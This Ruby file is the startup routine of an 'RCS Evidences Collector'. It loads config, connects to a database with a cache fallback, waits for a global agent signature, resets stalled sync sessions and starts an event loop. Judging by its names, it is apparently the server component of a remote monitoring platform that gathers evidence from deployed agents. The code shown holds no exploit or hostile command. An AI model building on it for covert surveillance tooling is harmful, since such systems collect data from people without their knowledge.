# The main file of the collector

# relatives
require_relative 'events'
require_relative 'config'
require_relative 'db'
require_relative 'evidence_manager'
require_relative 'statistics'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/component'

# from System
require 'yaml'

module RCS
  module Collector

    PUBLIC_DIR = '/public'

    class Application
      include RCS::Component

      component :collector, name: "RCS Evidences Collector"

      # the main of the collector
      def run(options)
        run_with_rescue do
          # ensure the public and log directory are present
          Dir::mkdir(Dir.pwd + PUBLIC_DIR) if not File.directory?(Dir.pwd + PUBLIC_DIR)

          # the global watchdog
          $watchdog = Mutex.new

          # config file parsing
          return 1 unless Config.instance.load_from_file

          # get the external ip address
          $external_address = MyIp.get

          # test the connection to the database
          begin
            if database.connect!(component) then
              trace :info, "Database connection succeeded"
            else
              trace :warn, "Database connection failed, using local cache..."
            end

            # cache initialization
            database.cache_init

            # wait 10 seconds and retry the connection
            # this case should happen only the first time we connect to the db
            # after the first successful connection, the cache will get populated
            # and even if the db is down we can continue
            if database.agent_signature.nil?
              trace :info, "Empty global signature, cannot continue. Waiting 10 seconds and retry..."
              sleep 10
            end
            # do not continue if we don't have the global agent signature
          end while database.agent_signature.nil?

          # if some instance are still in SYNC_IN_PROGRESS status, reset it to
          # SYNC_TIMEOUT. we are starting now, so no valid session can exist
          EvidenceManager.instance.sync_timeout_all

          # enter the main loop (hopefully will never exit from it)
          Events.new.setup
        end
      end
    end # Application::
  end # Collector::
end # RCS::
